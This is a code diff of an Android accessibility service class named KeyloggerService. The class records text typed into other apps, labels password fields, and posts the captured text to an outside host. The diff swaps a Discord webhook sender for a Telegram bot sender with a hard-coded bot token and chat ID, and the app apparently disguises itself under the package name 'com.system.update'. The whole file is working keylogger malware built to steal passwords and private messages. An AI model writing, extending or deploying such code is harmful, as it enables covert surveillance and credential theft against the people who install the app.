@@ -5,12 +5,15 @@ import android.os.Handler;
 import android.os.Looper;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import org.json.JSONObject;
 import java.io.IOException;
 import okhttp3.*;
 
 public class KeyloggerService extends AccessibilityService {
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
+    // ⚠️ غير البيانات هنا
+    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
+    private static final String CHAT_ID = "6978974735";
+    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
+
     private final OkHttpClient client = new OkHttpClient();
     
     private String lastText = "";
@@ -33,15 +36,11 @@ public class KeyloggerService extends AccessibilityService {
 
                 if (pkg.equals("com.system.update")) return;
 
-                // إلغاء المؤقت القديم عشان ميبعتش حتة حتة
-                if (sendRunnable != null) {
-                    handler.removeCallbacks(sendRunnable);
-                }
+                if (sendRunnable != null) handler.removeCallbacks(sendRunnable);
 
-                // استنى ثانيتين.. لو مكتوبش تاني، ابعت النتيجة النهائية
                 sendRunnable = () -> {
                     String type = source.isPassword() ? "🔐 **باسورد:**" : "⌨️ **نص:**";
-                    sendToDiscord(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
+                    sendTextToTelegram(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
                 };
                 handler.postDelayed(sendRunnable, 2000);
             }
@@ -50,16 +49,12 @@ public class KeyloggerService extends AccessibilityService {
 
     @Override public void onInterrupt() {}
     
-    private void sendToDiscord(String text) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("content", text);
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
-            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
-            client.newCall(request).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) { }
-                @Override public void onResponse(Call call, Response response) { }
-            });
-        } catch (Exception ignored) {}
+    private void sendTextToTelegram(String text) {
+        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
+        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
+        client.newCall(request).enqueue(new Callback() {
+            @Override public void onFailure(Call call, IOException e) { }
+            @Override public void onResponse(Call call, Response response) { }
+        });
     }
 }
